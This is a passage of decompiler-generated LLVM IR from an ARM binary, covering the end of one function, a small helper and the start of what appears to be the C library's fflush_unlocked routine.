  %v1_d1a0 = inttoptr i32 %v4_d198 to i32*
  %v2_d1a0 = load i32, i32* %v1_d1a0, align 4
  store i32 %v2_d1a0, i32* %r2.global-to-local, align 4
  %v1_d1a4 = add i32 %v3_d19c, 1
  store i32 %v1_d1a4, i32* %r3.global-to-local, align 4
  store i32 84, i32* %r7.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 %v1_d1a4, i32* %v2_d19c, align 4
  %v0_d1f4.pr = load i32, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_d1f411 = icmp eq i32 %v0_d1f4.pr, 0
  store i32 32816, i32* %r1.global-to-local, align 4
  br i1 %v2_d1f411, label %dec_label_pc_d200, label %dec_label_pc_d1b8

dec_label_pc_d1b8:                                ; preds = %dec_label_pc_d18c, %dec_label_pc_d1f0
  %v0_d1dc2 = phi i32 [ %v0_d1f0, %dec_label_pc_d1f0 ], [ %v0_d1f4.pr, %dec_label_pc_d18c ]
  %v1_d1b8 = inttoptr i32 %v0_d1dc2 to i16*
  %v2_d1b8 = load i16, i16* %v1_d1b8, align 2
  %v3_d1b8 = zext i16 %v2_d1b8 to i32
  store i32 %v3_d1b8, i32* %r3.global-to-local, align 4
  %v2_d1bc = and i32 %v3_d1b8, 32816
  store i32 %v2_d1bc, i32* %r1.global-to-local, align 4
  %v2_d1c0 = icmp ugt i32 %v2_d1bc, 47
  store i1 %v2_d1c0, i1* %cpsr_c.global-to-local, align 1
  %v7_d1c0 = icmp eq i32 %v2_d1bc, 48
  %v1_d1c4 = add i32 %v0_d1dc2, 32
  %v2_d1c4 = inttoptr i32 %v1_d1c4 to i32*
  %v3_d1c4 = load i32, i32* %v2_d1c4, align 4
  store i32 %v3_d1c4, i32* %r4.global-to-local, align 4
  br i1 %v7_d1c0, label %dec_label_pc_d1d0, label %.thread38

.thread38:                                        ; preds = %dec_label_pc_d1b8
  store i32 %v0_d1dc2, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_d1f0

dec_label_pc_d1d0:                                ; preds = %dec_label_pc_d1b8
  %v0_d1d0 = load i32, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_d1d0 = icmp eq i32 %v0_d1d0, 0
  br i1 %v2_d1d0, label %.thread, label %bb49

.thread:                                          ; preds = %dec_label_pc_d1d0
  %v1_d1d4 = load i32, i32* %r5.global-to-local, align 4
  %v2_d1d4 = load i32, i32* %r7.global-to-local, align 4
  %v3_d1d4 = add i32 %v2_d1d4, %v1_d1d4
  %v4_d1d4 = inttoptr i32 %v3_d1d4 to i32*
  %v5_d1d4 = load i32, i32* %v4_d1d4, align 4
  store i32 %v5_d1d4, i32* %r3.global-to-local, align 4
  %v3_d1d8 = inttoptr i32 %v5_d1d4 to i32*
  store i32 %v3_d1c4, i32* %v3_d1d8, align 4
  %v0_d1dc = load i32, i32* %r2.global-to-local, align 4
  %v1_d1dc = inttoptr i32 %v0_d1dc to i16*
  %v2_d1dc = load i16, i16* %v1_d1dc, align 2
  %v3_d1dc = zext i16 %v2_d1dc to i32
  store i32 %v3_d1dc, i32* %r3.global-to-local, align 4
  br label %bb50

bb49:                                             ; preds = %dec_label_pc_d1d0
  %v2_d1dc8 = load i16, i16* %v1_d1b8, align 2
  %v3_d1dc9 = zext i16 %v2_d1dc8 to i32
  store i32 %v3_d1dc9, i32* %r3.global-to-local, align 4
  %v3_d1e0 = add i32 %v0_d1d0, 32
  %v4_d1e0 = inttoptr i32 %v3_d1e0 to i32*
  store i32 %v3_d1c4, i32* %v4_d1e0, align 4
  %v0_d1e4.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb50

bb50:                                             ; preds = %.thread, %bb49
  %v0_d1e4 = phi i32 [ %v3_d1dc, %.thread ], [ %v0_d1e4.pre, %bb49 ]
  %v1_d1e4 = and i32 %v0_d1e4, 8192
  %v2_d1e4 = icmp eq i32 %v1_d1e4, 0
  br i1 %v2_d1e4, label %bb52, label %bb51

bb51:                                             ; preds = %bb50
  %v1_d1e8 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_d1e8, i32* %r0.global-to-local, align 4
  br label %bb52

bb52:                                             ; preds = %bb50, %bb51
  %v1_d1ec = xor i1 %v2_d1e4, true
  call void @__pseudo_cond_branch(i1 %v1_d1ec, i32 ptrtoint (i32* @global_var_f3b8.198 to i32))
  %v0_d1f0.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_d1f0

dec_label_pc_d1f0:                                ; preds = %.thread38, %bb52
  %v0_d1f0 = phi i32 [ %v0_d1f0.pre, %bb52 ], [ %v3_d1c4, %.thread38 ]
  store i32 %v0_d1f0, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_d1f4 = icmp eq i32 %v0_d1f0, 0
  store i32 32816, i32* %r1.global-to-local, align 4
  br i1 %v2_d1f4, label %dec_label_pc_d200, label %dec_label_pc_d1b8

dec_label_pc_d200:                                ; preds = %dec_label_pc_d1f0, %dec_label_pc_d18c
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_d204 = load i32, i32* %r5.global-to-local, align 4
  %v2_d204 = add i32 %v0_d204, 160
  %v3_d204 = inttoptr i32 %v2_d204 to i32*
  %v4_d204 = load i32, i32* %v3_d204, align 4
  store i32 %v4_d204, i32* %r0.global-to-local, align 4
  %v1_d208 = add i32 %v4_d204, 4
  %v2_d208 = inttoptr i32 %v1_d208 to i32*
  %v3_d208 = load i32, i32* %v2_d208, align 4
  %v1_d20c = add i32 %v3_d208, -1
  store i32 %v1_d20c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_d210 = icmp eq i32 %v1_d20c, 0
  store i32 %v1_d20c, i32* %v2_d208, align 4
  br i1 %v2_d210, label %dec_label_pc_d21c, label %dec_label_pc_d27c

dec_label_pc_d21c:                                ; preds = %dec_label_pc_d200
  %v0_d21c = load i32, i32* %r3.global-to-local, align 4
  %v1_d21c = load i32, i32* %r0.global-to-local, align 4
  %v2_d21c = add i32 %v1_d21c, 8
  %v3_d21c = inttoptr i32 %v2_d21c to i32*
  store i32 %v0_d21c, i32* %v3_d21c, align 4
  %v0_d220 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_d220, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_d224

dec_label_pc_d224:                                ; preds = %dec_label_pc_d254.dec_label_pc_d224_crit_edge, %dec_label_pc_d21c
  %v0_d224 = phi i32 [ %v0_d224.pre, %dec_label_pc_d254.dec_label_pc_d224_crit_edge ], [ %v0_d220, %dec_label_pc_d21c ]
  %v1_d224 = inttoptr i32 %v0_d224 to i32*
  %v2_d224 = load i32, i32* %v1_d224, align 4
  store i32 %v2_d224, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_d224, i32* %r2.global-to-local, align 4
  %v2_d23074 = load i32, i32* %v1_d224, align 4
  store i32 %v2_d23074, i32* %r3.global-to-local, align 4
  %v3_d23476 = icmp uge i32 %v2_d23074, %v2_d224
  store i1 %v3_d23476, i1* %cpsr_c.global-to-local, align 1
  %v9_d23482 = icmp eq i32 %v2_d23074, %v2_d224
  br i1 %v9_d23482, label %dec_label_pc_d23c, label %dec_label_pc_d254

dec_label_pc_d23c:                                ; preds = %dec_label_pc_d224, %dec_label_pc_d23c.dec_label_pc_d230_crit_edge
  %v0_d23c83 = phi i32 [ %v1_d234.pre, %dec_label_pc_d23c.dec_label_pc_d230_crit_edge ], [ %v2_d224, %dec_label_pc_d224 ]
  store i32 %v0_d23c83, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_d24c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_d24c, label %dec_label_pc_d250, label %dec_label_pc_d23c.dec_label_pc_d230_crit_edge

dec_label_pc_d23c.dec_label_pc_d230_crit_edge:    ; preds = %dec_label_pc_d23c
  %v0_d230.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_d234.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_d230 = inttoptr i32 %v0_d230.pre to i32*
  %v2_d230 = load i32, i32* %v1_d230, align 4
  store i32 %v2_d230, i32* %r3.global-to-local, align 4
  %v3_d234 = icmp uge i32 %v2_d230, %v1_d234.pre
  store i1 %v3_d234, i1* %cpsr_c.global-to-local, align 1
  %v9_d234 = icmp eq i32 %v2_d230, %v1_d234.pre
  br i1 %v9_d234, label %dec_label_pc_d23c, label %dec_label_pc_d254

dec_label_pc_d250:                                ; preds = %dec_label_pc_d23c
  %v0_d250 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_d250, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_d254

dec_label_pc_d254:                                ; preds = %dec_label_pc_d224, %dec_label_pc_d23c.dec_label_pc_d230_crit_edge, %dec_label_pc_d250
  %v0_d25c = phi i32 [ %v0_d250, %dec_label_pc_d250 ], [ %v2_d23074, %dec_label_pc_d224 ], [ %v2_d230, %dec_label_pc_d23c.dec_label_pc_d230_crit_edge ]
  %v1_d254 = phi i32 [ %v0_d250, %dec_label_pc_d250 ], [ %v2_d224, %dec_label_pc_d224 ], [ %v1_d234.pre, %dec_label_pc_d23c.dec_label_pc_d230_crit_edge ]
  %v3_d254 = icmp uge i32 %v0_d25c, %v1_d254
  store i1 %v3_d254, i1* %cpsr_c.global-to-local, align 1
  %v9_d254 = icmp eq i32 %v0_d25c, %v1_d254
  br i1 %v9_d254, label %dec_label_pc_d25c, label %dec_label_pc_d254.dec_label_pc_d224_crit_edge

dec_label_pc_d254.dec_label_pc_d224_crit_edge:    ; preds = %dec_label_pc_d254
  %v0_d224.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_d224

dec_label_pc_d25c:                                ; preds = %dec_label_pc_d254
  %v2_d25c = icmp ne i32 %v1_d254, 0
  store i1 %v2_d25c, i1* %cpsr_c.global-to-local, align 1
  %v7_d260 = icmp slt i32 %v1_d254, 2
  br i1 %v7_d260, label %dec_label_pc_d27c, label %dec_label_pc_d264

dec_label_pc_d264:                                ; preds = %dec_label_pc_d25c
  %v0_d264 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_d264, i32* %r0.global-to-local, align 4
  %v0_d268 = load i32, i32* %r1.global-to-local, align 4
  %v1_d268 = add i32 %v0_d268, 129
  store i32 %v1_d268, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_d27c

dec_label_pc_d27c:                                ; preds = %dec_label_pc_d200, %dec_label_pc_d264, %dec_label_pc_d25c
  store i32 88, i32* %r3.global-to-local, align 4
  %v0_d280 = load i32, i32* %r5.global-to-local, align 4
  %v2_d280 = add i32 %v0_d280, 88
  %v3_d280 = inttoptr i32 %v2_d280 to i32*
  %v4_d280 = load i32, i32* %v3_d280, align 4
  store i32 %v4_d280, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_d288 = inttoptr i32 %v4_d280 to i32*
  store i32 0, i32* %v2_d288, align 4
  br label %dec_label_pc_d28c

dec_label_pc_d28c:                                ; preds = %dec_label_pc_d100, %dec_label_pc_d128, %dec_label_pc_d27c
  store i32 168, i32* %r3.global-to-local, align 4
  %v0_d290 = load i32, i32* %r5.global-to-local, align 4
  %v2_d290 = add i32 %v0_d290, 168
  %v3_d290 = inttoptr i32 %v2_d290 to i32*
  %v4_d290 = load i32, i32* %v3_d290, align 4
  store i32 %v4_d290, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_d298 = add i32 %v0_d290, 12
  %v3_d298 = inttoptr i32 %v2_d298 to i32*
  %v4_d298 = load i32, i32* %v3_d298, align 4
  store i32 %v4_d298, i32* @r1, align 4
  %v1_d29c = add i32 %v4_d290, 4
  %v2_d29c = inttoptr i32 %v1_d29c to i32*
  %v3_d29c = load i32, i32* %v2_d29c, align 4
  store i32 %v3_d29c, i32* %r2.global-to-local, align 4
  %v1_d2a0 = inttoptr i32 %v4_d298 to i32*
  %v2_d2a0 = load i32, i32* %v1_d2a0, align 4
  %v1_d2a4 = add i32 %v3_d29c, -1
  store i32 %v1_d2a4, i32* %r2.global-to-local, align 4
  %v1_d2a8 = add i32 %v2_d2a0, -1
  store i32 %v1_d2a8, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_d2ac = icmp eq i32 %v1_d2a4, 0
  store i32 %v1_d2a8, i32* %v1_d2a0, align 4
  %v0_d2b4 = load i32, i32* %r2.global-to-local, align 4
  %v1_d2b4 = load i32, i32* %r0.global-to-local, align 4
  %v2_d2b4 = add i32 %v1_d2b4, 4
  %v3_d2b4 = inttoptr i32 %v2_d2b4 to i32*
  store i32 %v0_d2b4, i32* %v3_d2b4, align 4
  br i1 %v2_d2ac, label %dec_label_pc_d2bc, label %dec_label_pc_d31c

dec_label_pc_d2bc:                                ; preds = %dec_label_pc_d28c
  %v0_d2bc = load i32, i32* %r2.global-to-local, align 4
  %v1_d2bc = load i32, i32* %r0.global-to-local, align 4
  %v2_d2bc = add i32 %v1_d2bc, 8
  %v3_d2bc = inttoptr i32 %v2_d2bc to i32*
  store i32 %v0_d2bc, i32* %v3_d2bc, align 4
  %v0_d2c0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_d2c0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_d2c4

dec_label_pc_d2c4:                                ; preds = %dec_label_pc_d2f4.dec_label_pc_d2c4_crit_edge, %dec_label_pc_d2bc
  %v0_d2c4 = phi i32 [ %v0_d2c4.pre, %dec_label_pc_d2f4.dec_label_pc_d2c4_crit_edge ], [ %v0_d2c0, %dec_label_pc_d2bc ]
  %v1_d2c4 = inttoptr i32 %v0_d2c4 to i32*
  %v2_d2c4 = load i32, i32* %v1_d2c4, align 4
  store i32 %v2_d2c4, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_d2c4, i32* %r2.global-to-local, align 4
  %v2_d2d062 = load i32, i32* %v1_d2c4, align 4
  store i32 %v2_d2d062, i32* %r3.global-to-local, align 4
  %v3_d2d464 = icmp uge i32 %v2_d2d062, %v2_d2c4
  store i1 %v3_d2d464, i1* %cpsr_c.global-to-local, align 1
  %v9_d2d470 = icmp eq i32 %v2_d2d062, %v2_d2c4
  br i1 %v9_d2d470, label %dec_label_pc_d2dc, label %dec_label_pc_d2f4

dec_label_pc_d2dc:                                ; preds = %dec_label_pc_d2c4, %dec_label_pc_d2dc.dec_label_pc_d2d0_crit_edge
  %v0_d2dc71 = phi i32 [ %v1_d2d4.pre, %dec_label_pc_d2dc.dec_label_pc_d2d0_crit_edge ], [ %v2_d2c4, %dec_label_pc_d2c4 ]
  store i32 %v0_d2dc71, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_d2ec = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_d2ec, label %dec_label_pc_d2f0, label %dec_label_pc_d2dc.dec_label_pc_d2d0_crit_edge

dec_label_pc_d2dc.dec_label_pc_d2d0_crit_edge:    ; preds = %dec_label_pc_d2dc
  %v0_d2d0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_d2d4.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_d2d0 = inttoptr i32 %v0_d2d0.pre to i32*
  %v2_d2d0 = load i32, i32* %v1_d2d0, align 4
  store i32 %v2_d2d0, i32* %r3.global-to-local, align 4
  %v3_d2d4 = icmp uge i32 %v2_d2d0, %v1_d2d4.pre
  store i1 %v3_d2d4, i1* %cpsr_c.global-to-local, align 1
  %v9_d2d4 = icmp eq i32 %v2_d2d0, %v1_d2d4.pre
  br i1 %v9_d2d4, label %dec_label_pc_d2dc, label %dec_label_pc_d2f4

dec_label_pc_d2f0:                                ; preds = %dec_label_pc_d2dc
  %v0_d2f0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_d2f0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_d2f4

dec_label_pc_d2f4:                                ; preds = %dec_label_pc_d2c4, %dec_label_pc_d2dc.dec_label_pc_d2d0_crit_edge, %dec_label_pc_d2f0
  %v0_d2fc = phi i32 [ %v0_d2f0, %dec_label_pc_d2f0 ], [ %v2_d2d062, %dec_label_pc_d2c4 ], [ %v2_d2d0, %dec_label_pc_d2dc.dec_label_pc_d2d0_crit_edge ]
  %v1_d2f4 = phi i32 [ %v0_d2f0, %dec_label_pc_d2f0 ], [ %v2_d2c4, %dec_label_pc_d2c4 ], [ %v1_d2d4.pre, %dec_label_pc_d2dc.dec_label_pc_d2d0_crit_edge ]
  %v3_d2f4 = icmp uge i32 %v0_d2fc, %v1_d2f4
  store i1 %v3_d2f4, i1* %cpsr_c.global-to-local, align 1
  %v9_d2f4 = icmp eq i32 %v0_d2fc, %v1_d2f4
  br i1 %v9_d2f4, label %dec_label_pc_d2fc, label %dec_label_pc_d2f4.dec_label_pc_d2c4_crit_edge

dec_label_pc_d2f4.dec_label_pc_d2c4_crit_edge:    ; preds = %dec_label_pc_d2f4
  %v0_d2c4.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_d2c4

dec_label_pc_d2fc:                                ; preds = %dec_label_pc_d2f4
  %v2_d2fc = icmp ne i32 %v1_d2f4, 0
  store i1 %v2_d2fc, i1* %cpsr_c.global-to-local, align 1
  %v7_d300 = icmp slt i32 %v1_d2f4, 2
  br i1 %v7_d300, label %dec_label_pc_d31c, label %dec_label_pc_d304

dec_label_pc_d304:                                ; preds = %dec_label_pc_d2fc
  %v0_d304 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_d304, i32* %r0.global-to-local, align 4
  %v0_d308 = load i32, i32* @r1, align 4
  %v1_d308 = add i32 %v0_d308, 129
  store i32 %v1_d308, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_d31c

dec_label_pc_d31c:                                ; preds = %dec_label_pc_d28c, %dec_label_pc_d304, %dec_label_pc_d2fc
  %v2_d320 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_d320, i32* %r4.global-to-local, align 4
  %v1_d324 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_d324

; uselistorder directives
  uselistorder i32 %v0_d2f0, { 1, 0, 2 }
  uselistorder i32 %v1_d2d4.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_d2c4, { 1, 0 }
  uselistorder i32 %v0_d250, { 1, 0, 2 }
  uselistorder i32 %v1_d234.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_d224, { 1, 0 }
  uselistorder i32 %v0_d1f0, { 2, 1, 0 }
  uselistorder i32 %v0_d194, { 1, 0 }
  uselistorder i32 %v0_d178, { 1, 0, 2 }
  uselistorder i32 %v1_d15c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_d148, { 1, 0 }
  uselistorder i32 %v0_d0ec, { 1, 0, 2 }
  uselistorder i32 %v1_d0d0.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v4_d0a4, { 2, 1, 0, 3 }
  uselistorder i32* %r7.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10, 12, 14, 13, 15 }
  uselistorder i32* %r6.global-to-local, { 5, 6, 0, 1, 2, 3, 4 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 6, 4, 5, 7 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 12, 14 }
  uselistorder i32* %r3.global-to-local, { 4, 5, 7, 6, 0, 8, 9, 10, 11, 12, 13, 14, 16, 15, 2, 17, 18, 19, 43, 44, 20, 21, 22, 23, 24, 25, 26, 28, 27, 1, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 40, 39, 3, 41, 42 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 5, 4, 0, 6, 7, 8 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i1* %cpsr_c.global-to-local, { 5, 6, 8, 7, 4, 9, 10, 11, 13, 12, 3, 14, 17, 15, 16, 2, 18, 20, 19, 0, 21, 22, 23, 24, 26, 25, 1, 27 }
  uselistorder i32 32816, { 2, 0, 1 }
  uselistorder label %dec_label_pc_d31c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_d2f4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_d2dc, { 1, 0 }
  uselistorder label %dec_label_pc_d28c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_d27c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_d254, { 2, 1, 0 }
  uselistorder label %dec_label_pc_d23c, { 1, 0 }
  uselistorder label %dec_label_pc_d1f0, { 1, 0 }
  uselistorder label %bb52, { 1, 0 }
  uselistorder label %bb50, { 1, 0 }
  uselistorder label %dec_label_pc_d1b8, { 1, 0 }
  uselistorder label %dec_label_pc_d18c, { 1, 0 }
  uselistorder label %bb48, { 1, 0 }
  uselistorder label %dec_label_pc_d17c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_d164, { 1, 0 }
  uselistorder label %dec_label_pc_d100, { 1, 0 }
  uselistorder label %bb45, { 1, 0 }
  uselistorder label %dec_label_pc_d0f0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_d0d8, { 1, 0 }
}

define i32 @function_d32c(i32 %arg1) local_unnamed_addr {
dec_label_pc_d32c:
  %v0_d32c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_d32c, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_d32c
  %v2_d32c = load i32, i32* @r8, align 4
  %v5_d32c = udiv i32 %v2_d32c, 2
  %v6_d32c = and i32 %v5_d32c, %arg1
  %v2_d330 = load i32, i32* @ip, align 4
  %v3_d330 = and i32 %v6_d32c, %v2_d330
  %v8_d334 = ashr i32 %v2_d32c, %v3_d330
  %v9_d334 = and i32 %v8_d334, %v3_d330
  %v5_d338 = udiv i32 %v9_d334, 2
  %v6_d338 = and i32 %v5_d338, %v9_d334
  %v2_d33c = load i32, i32* @r4, align 4
  %v8_d33c = ashr i32 %v2_d33c, %v6_d338
  %v9_d33c = and i32 %v8_d33c, %v6_d338
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_d32c, %bb
  %v10_d340 = phi i32 [ %arg1, %dec_label_pc_d32c ], [ %v9_d33c, %bb ]
  ret i32 %v10_d340

; uselistorder directives
  uselistorder i32 %v9_d334, { 1, 0 }
  uselistorder i32 %v2_d32c, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @fflush_unlocked(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %v6_d344 = load i32, i32* @r5, align 4
  store i32 84, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23104.179 to i32), i32* @r6, align 4
  %v4_d354 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 84) to i32*), align 4
  store i32 %v4_d354, i32* %r3.global-to-local, align 4
  %v4_d358 = icmp uge i32 %tmp, %v4_d354
  store i1 %v4_d358, i1* %cpsr_c.global-to-local, align 1
  %v10_d358 = icmp eq i32 %tmp, %v4_d354
  br i1 %v10_d358, label %bb, label %dec_label_pc_d370

bb:                                               ; preds = %entry
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %tmp, i32* @r4, align 4
  br label %dec_label_pc_d380

dec_label_pc_d370:                                ; preds = %entry
  store i32 %tmp, i32* @r4, align 4
  store i32 256, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v3_d374 = icmp eq i16* %arg1, null
  br i1 %v3_d374, label %dec_label_pc_d380, label %dec_label_pc_d694

dec_label_pc_d380:                                ; preds = %bb, %dec_label_pc_d370
  %stack_var_-44.1 = phi i32 [ 0, %bb ], [ 256, %dec_label_pc_d370 ]
  store i32 168, i32* %r3.global-to-local, align 4
  %v4_d384 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 168) to i32*), align 4
  store i32 %v4_d384, i32* %r5.global-to-local, align 4
  %v0_d388 = call i32 @__aeabi_read_tp()
  store i32 %v0_d388, i32* %r0.global-to-local, align 4
  %v1_d38c = add i32 %v4_d384, 8
  %v2_d38c = inttoptr i32 %v1_d38c to i32*
  %v3_d38c = load i32, i32* %v2_d38c, align 4
  store i32 %v3_d38c, i32* %r3.global-to-local, align 4
  %v1_d390 = add i32 %v0_d388, -1168
  store i32 %v1_d390, i32* %r8.global-to-local, align 4
  %v3_d394 = icmp uge i32 %v3_d38c, %v1_d390
  store i1 %v3_d394, i1* %cpsr_c.global-to-local, align 1
  %v9_d394 = icmp eq i32 %v3_d38c, %v1_d390
  br i1 %v9_d394, label %dec_label_pc_d3dc, label %dec_label_pc_d39c

dec_label_pc_d39c:                                ; preds = %dec_label_pc_d380
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_d384, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_d3a8143 = inttoptr i32 %v4_d384 to i32*
  %v2_d3a8144 = load i32, i32* %v1_d3a8143, align 4
  store i32 %v2_d3a8144, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_d3ac146 = icmp eq i32 %v2_d3a8144, 0
  br i1 %v9_d3ac146, label %dec_label_pc_d3b4, label %dec_label_pc_d3cc

dec_label_pc_d3b4:                                ; preds = %dec_label_pc_d39c, %dec_label_pc_d3b4.dec_label_pc_d3a8_crit_edge
  %v0_d3b4147 = phi i32 [ %v1_d3ac.pre, %dec_label_pc_d3b4.dec_label_pc_d3a8_crit_edge ], [ 0, %dec_label_pc_d39c ]
  store i32 %v0_d3b4147, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_d3c4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_d3c4, label %dec_label_pc_d3c8, label %dec_label_pc_d3b4.dec_label_pc_d3a8_crit_edge

dec_label_pc_d3b4.dec_label_pc_d3a8_crit_edge:    ; preds = %dec_label_pc_d3b4
  %v0_d3a8.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_d3ac.pre = load i32, i32* @r4, align 4
  %v1_d3a8 = inttoptr i32 %v0_d3a8.pre to i32*
  %v2_d3a8 = load i32, i32* %v1_d3a8, align 4
  store i32 %v2_d3a8, i32* %r3.global-to-local, align 4
  %v3_d3ac = icmp uge i32 %v2_d3a8, %v1_d3ac.pre
  store i1 %v3_d3ac, i1* %cpsr_c.global-to-local, align 1
  %v9_d3ac = icmp eq i32 %v2_d3a8, %v1_d3ac.pre
  br i1 %v9_d3ac, label %dec_label_pc_d3b4, label %dec_label_pc_d3cc

dec_label_pc_d3c8:                                ; preds = %dec_label_pc_d3b4
  %v0_d3c8 = load i32, i32* @r4, align 4
  store i32 %v0_d3c8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_d3cc

dec_label_pc_d3cc:                                ; preds = %dec_label_pc_d39c, %dec_label_pc_d3b4.dec_label_pc_d3a8_crit_edge, %dec_label_pc_d3c8
  %v0_d3cc = phi i32 [ %v0_d3c8, %dec_label_pc_d3c8 ], [ %v2_d3a8144, %dec_label_pc_d39c ], [ %v2_d3a8, %dec_label_pc_d3b4.dec_label_pc_d3a8_crit_edge ]
  %v1_d3cc = phi i32 [ %v0_d3c8, %dec_label_pc_d3c8 ], [ 0, %dec_label_pc_d39c ], [ %v1_d3ac.pre, %dec_label_pc_d3b4.dec_label_pc_d3a8_crit_edge ]
  %v3_d3cc = icmp uge i32 %v0_d3cc, %v1_d3cc
  store i1 %v3_d3cc, i1* %cpsr_c.global-to-local, align 1
  %v9_d3cc = icmp eq i32 %v0_d3cc, %v1_d3cc
  br i1 %v9_d3cc, label %bb66, label %bb65

bb65:                                             ; preds = %dec_label_pc_d3cc
  %v1_d3d0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_d3d0, i32* %r0.global-to-local, align 4
  br label %bb66

bb66:                                             ; preds = %dec_label_pc_d3cc, %bb65
  %v1_d3d4 = xor i1 %v9_d3cc, true
  call void @__pseudo_cond_branch(i1 %v1_d3d4, i32 ptrtoint (i32* @global_var_10b94.194 to i32))
  %v0_d3d8 = load i32, i32* %r8.global-to-local, align 4
